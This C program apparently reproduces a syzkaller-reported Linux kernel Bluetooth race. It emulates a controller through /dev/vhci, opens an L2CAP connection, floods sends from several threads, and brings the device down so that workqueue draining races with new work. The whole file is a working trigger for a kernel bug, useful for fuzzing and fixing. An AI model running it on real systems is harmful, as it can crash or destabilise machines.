// https://syzkaller.appspot.com/bug?id=804b8b2ba268daf4e81ac6a21340991ad5ec8e5f
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <pthread.h>
#include <string.h>
#include <stdint.h>
#include <errno.h>

#define AF_BLUETOOTH 31
#define PF_BLUETOOTH AF_BLUETOOTH
#define BTPROTO_HCI 1
#define BTPROTO_L2CAP 0

#define HCIGETDEVLIST _IOR('H', 210, int)
#define HCIDEVUP      _IOW('H', 201, int)
#define HCIDEVDOWN    _IOW('H', 202, int)

struct hci_dev_req {
    uint16_t dev_id;
    uint32_t dev_opt;
};

struct hci_dev_list_req {
    uint16_t dev_num;
    struct hci_dev_req dev_req[0];
};

struct sockaddr_l2 {
    sa_family_t l2_family;
    uint16_t    l2_psm;
    uint8_t     l2_bdaddr[6];
    uint16_t    l2_cid;
    uint8_t     l2_bdaddr_type;
};

int vhci_fd;
int l2cap_fd;

void *vhci_thread(void *arg) {
    uint16_t handle = 42;
    uint16_t remote_dcid = 0x0040;
    uint16_t local_scid = 0;

    while (1) {
        unsigned char buf[1024];
        int n = read(vhci_fd, buf, sizeof(buf));
        if (n <= 0) continue;

        if (buf[0] == 0x01 && n >= 4) { // HCI_COMMAND_PKT
            uint16_t opcode = buf[1] | (buf[2] << 8);
            if ((opcode >> 10) == 1) { // Link Control Commands
                unsigned char cmd_status[] = { 0x04, 0x0f, 4, 0, 1, opcode & 0xff, opcode >> 8 };
                write(vhci_fd, cmd_status, sizeof(cmd_status));
                
                if (opcode == 0x0405) { // Create Connection
                    unsigned char conn_comp[] = {
                        0x04, 0x03, 11, 0, handle & 0xff, handle >> 8,
                        buf[4], buf[5], buf[6], buf[7], buf[8], buf[9],
                        1, 0
                    };
                    write(vhci_fd, conn_comp, sizeof(conn_comp));
                } else if (opcode == 0x041b) { // Read Remote Features
                    unsigned char rem_feat[] = {
                        0x04, 0x0b, 11, 0, handle & 0xff, handle >> 8,
                        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff
                    };
                    write(vhci_fd, rem_feat, sizeof(rem_feat));
                } else if (opcode == 0x041c) { // Read Remote Ext Features
                    unsigned char rem_ext_feat[] = {
                        0x04, 0x23, 13, 0, handle & 0xff, handle >> 8,
                        1, 1, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff
                    };
                    write(vhci_fd, rem_ext_feat, sizeof(rem_ext_feat));
                } else if (opcode == 0x041d) { // Read Remote Version
                    unsigned char rem_ver[] = {
                        0x04, 0x0c, 8, 0, handle & 0xff, handle >> 8,
                        0x0b, 0x00, 0x00, 0x00, 0x00
                    };
                    write(vhci_fd, rem_ver, sizeof(rem_ver));
                } else if (opcode == 0x041f) { // Read Clock Offset
                    unsigned char clock_off[] = {
                        0x04, 0x1c, 5, 0, handle & 0xff, handle >> 8,
                        0x00, 0x00
                    };
                    write(vhci_fd, clock_off, sizeof(clock_off));
                } else if (opcode == 0x0406) { // Disconnect
                    unsigned char disc_comp[] = { 0x04, 0x05, 4, 0, handle & 0xff, handle >> 8, 0x16 };
                    write(vhci_fd, disc_comp, sizeof(disc_comp));
                }
            } else {
                unsigned char resp[258];
                memset(resp, 0, sizeof(resp));
                resp[0] = 0x04;
                resp[1] = 0x0e;
                resp[2] = 255; // Send a large payload by default to satisfy min_len checks
                resp[3] = 1;
                resp[4] = buf[1];
                resp[5] = buf[2];
                resp[6] = 0;
                
                if (opcode == 0x1003) { // Read Local Features
                    resp[2] = 12;
                    memset(&resp[7], 0xff, 8);
                    resp[11] &= ~0x20; // Clear LMP_NO_BREDR
                } else if (opcode == 0x1009) { // Read BD_ADDR
                    resp[2] = 10;
                    resp[7] = 0xaa; resp[8] = 0xbb; resp[9] = 0xcc;
                    resp[10] = 0xdd; resp[11] = 0xee; resp[12] = 0xff;
                } else if (opcode == 0x1001) { // Read Local Version
                    resp[2] = 12;
                } else if (opcode == 0x1005) { // Read Buffer Size
                    resp[2] = 11;
                    resp[7] = 0xff; resp[8] = 0x00;
                    resp[9] = 0xff;
                    resp[10] = 0xff; resp[11] = 0x00;
                    resp[12] = 0xff; resp[13] = 0x00;
                } else if (opcode == 0x1004) { // Read Local Ext Features
                    resp[2] = 14;
                    resp[7] = buf[3]; // page
                    resp[8] = 1; // max page
                    memset(&resp[9], 0xff, 8);
                } else if (opcode == 0x2002) { // LE Read Buffer Size
                    resp[2] = 7;
                    resp[7] = 0xff; resp[8] = 0x00;
                    resp[9] = 0xff;
                }
                write(vhci_fd, resp, 3 + resp[2]);
            }
        } else if (buf[0] == 0x02 && n >= 13) { // HCI_ACLDATA_PKT
            uint16_t h = buf[1] | ((buf[2] & 0x0f) << 8);
            if (h != handle) continue;
            
            // Send Number of Completed Packets event to free socket memory
            unsigned char comp_pkts[8];
            comp_pkts[0] = 0x04;
            comp_pkts[1] = 0x13;
            comp_pkts[2] = 5;
            comp_pkts[3] = 1;
            comp_pkts[4] = handle & 0xff;
            comp_pkts[5] = handle >> 8;
            comp_pkts[6] = 1;
            comp_pkts[7] = 0;
            write(vhci_fd, comp_pkts, 8);

            uint16_t l2cap_cid = buf[7] | (buf[8] << 8);
            if (l2cap_cid == 1) { // Signaling channel
                uint8_t code = buf[9];
                uint8_t ident = buf[10];
                uint16_t cmd_len = buf[11] | (buf[12] << 8);
                
                if (code == 0x0a && n >= 15) { // Info Req
                    uint16_t type = buf[13] | (buf[14] << 8);
                    unsigned char rsp[17];
                    rsp[0] = 0x02;
                    rsp[1] = handle & 0xff; rsp[2] = (handle >> 8) | 0x20;
                    rsp[3] = 12; rsp[4] = 0;
                    rsp[5] = 8; rsp[6] = 0;
                    rsp[7] = 1; rsp[8] = 0;
                    rsp[9] = 0x0b; // Info Rsp
                    rsp[10] = ident;
                    rsp[11] = 4; rsp[12] = 0;
                    rsp[13] = type & 0xff; rsp[14] = type >> 8;
                    rsp[15] = 1; rsp[16] = 0; // Not supported
                    write(vhci_fd, rsp, 17);
                } else if (code == 0x02 && n >= 17) { // Conn Req
                    local_scid = buf[15] | (buf[16] << 8);
                    unsigned char rsp[21];
                    rsp[0] = 0x02;
                    rsp[1] = handle & 0xff; rsp[2] = (handle >> 8) | 0x20;
                    rsp[3] = 16; rsp[4] = 0;
                    rsp[5] = 12; rsp[6] = 0;
                    rsp[7] = 1; rsp[8] = 0;
                    rsp[9] = 0x03; // Conn Rsp
                    rsp[10] = ident;
                    rsp[11] = 8; rsp[12] = 0;
                    rsp[13] = remote_dcid & 0xff; rsp[14] = remote_dcid >> 8;
                    rsp[15] = local_scid & 0xff; rsp[16] = local_scid >> 8;
                    rsp[17] = 0; rsp[18] = 0; // Success
                    rsp[19] = 0; rsp[20] = 0; // Status
                    write(vhci_fd, rsp, 21);
                } else if (code == 0x04 && n >= 17) { // Conf Req
                    int opt_len = cmd_len - 4;
                    if (opt_len < 0) opt_len = 0;
                    if (opt_len > 64) opt_len = 64;
                    
                    unsigned char rsp[128];
                    rsp[0] = 0x02;
                    rsp[1] = handle & 0xff; rsp[2] = (handle >> 8) | 0x20;
                    rsp[3] = 14 + opt_len; rsp[4] = 0;
                    rsp[5] = 10 + opt_len; rsp[6] = 0;
                    rsp[7] = 1; rsp[8] = 0;
                    rsp[9] = 0x05; // Conf Rsp
                    rsp[10] = ident;
                    rsp[11] = 6 + opt_len; rsp[12] = 0;
                    rsp[13] = local_scid & 0xff; rsp[14] = local_scid >> 8;
                    rsp[15] = 0; rsp[16] = 0; // Flags
                    rsp[17] = 0; rsp[18] = 0; // Success
                    if (opt_len > 0) memcpy(&rsp[19], &buf[17], opt_len);
                    write(vhci_fd, rsp, 19 + opt_len);
                    
                    unsigned char req[17];
                    req[0] = 0x02;
                    req[1] = handle & 0xff; req[2] = (handle >> 8) | 0x20;
                    req[3] = 12; req[4] = 0;
                    req[5] = 8; req[6] = 0;
                    req[7] = 1; req[8] = 0;
                    req[9] = 0x04; // Conf Req
                    req[10] = 0x42; // our ident
                    req[11] = 4; req[12] = 0;
                    req[13] = local_scid & 0xff; req[14] = local_scid >> 8;
                    req[15] = 0; req[16] = 0; // Flags
                    write(vhci_fd, req, 17);
                }
            }
        }
    }
    return NULL;
}

void *send_thread(void *arg) {
    char buf[64] = {0};
    while (1) {
        send(l2cap_fd, buf, sizeof(buf), MSG_DONTWAIT);
    }
    return NULL;
}

int main() {
    alarm(10); // Prevent hanging indefinitely

    vhci_fd = open("/dev/vhci", O_RDWR);
    if (vhci_fd < 0) {
        printf("[-] Failed to open /dev/vhci: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] open /dev/vhci successful.\n");

    // Create virtual HCI device
    char req[2] = { 0xff, 0x00 }; // HCI_VENDOR_PKT
    if (write(vhci_fd, req, 2) < 0) {
        printf("[-] Failed to write to /dev/vhci: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] write to /dev/vhci successful.\n");

    pthread_t vt;
    if (pthread_create(&vt, NULL, vhci_thread, NULL) != 0) {
        printf("[-] Failed to create vhci_thread\n");
        exit(1);
    }
    printf("[+] pthread_create vhci_thread successful.\n");

    int ctl_fd = socket(AF_BLUETOOTH, SOCK_RAW, BTPROTO_HCI);
    if (ctl_fd < 0) {
        printf("[-] Failed to socket HCI: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] socket HCI successful.\n");

    // Wait for the device to be registered
    char buf[1024];
    struct hci_dev_list_req *dl = (struct hci_dev_list_req *)buf;
    int dev_id = -1;
    for (int i = 0; i < 10; i++) {
        dl->dev_num = 1;
        if (ioctl(ctl_fd, HCIGETDEVLIST, dl) == 0 && dl->dev_num > 0) {
            dev_id = dl->dev_req[0].dev_id;
            break;
        }
        usleep(100000);
    }
    if (dev_id < 0) {
        printf("[-] Failed to find HCI device\n");
        exit(1);
    }
    printf("[+] HCI device found: %d\n", dev_id);

    // Bring device UP
    if (ioctl(ctl_fd, HCIDEVUP, dev_id) < 0) {
        if (errno != EALREADY) {
            printf("[-] Failed to HCIDEVUP: %s\n", strerror(errno));
            exit(1);
        }
    }
    printf("[+] HCIDEVUP successful (or EALREADY).\n");
    usleep(500000);

    // Create L2CAP SEQPACKET socket
    l2cap_fd = socket(PF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP);
    if (l2cap_fd < 0) {
        printf("[-] Failed to socket L2CAP: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] socket L2CAP successful.\n");

    struct sockaddr_l2 addr = {0};
    addr.l2_family = AF_BLUETOOTH;
    addr.l2_psm = 0x0f; // BNEP PSM or any PSM
    addr.l2_bdaddr[0] = 0x01;
    addr.l2_bdaddr[1] = 0x02;
    addr.l2_bdaddr[2] = 0x03;
    addr.l2_bdaddr[3] = 0x04;
    addr.l2_bdaddr[4] = 0x05;
    addr.l2_bdaddr[5] = 0x06;

    // Connect the L2CAP socket. This will trigger the full L2CAP handshake
    if (connect(l2cap_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        printf("[-] Failed to connect L2CAP: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] connect L2CAP successful.\n");

    // Spawn sender threads to widen the race window
    pthread_t st[4];
    for (int i = 0; i < 4; i++) {
        if (pthread_create(&st[i], NULL, send_thread, NULL) != 0) {
            printf("[-] Failed to create send_thread\n");
            exit(1);
        }
    }
    printf("[+] pthread_create send_thread successful.\n");

    usleep(100000);

    // Trigger the race condition by bringing the device DOWN.
    // This executes drain_workqueue() while the threads are concurrently calling queue_work()
    if (ioctl(ctl_fd, HCIDEVDOWN, dev_id) < 0) {
        printf("[-] Failed to HCIDEVDOWN: %s\n", strerror(errno));
    } else {
        printf("[+] HCIDEVDOWN successful.\n");
    }

    sleep(2);
    return 0;
}
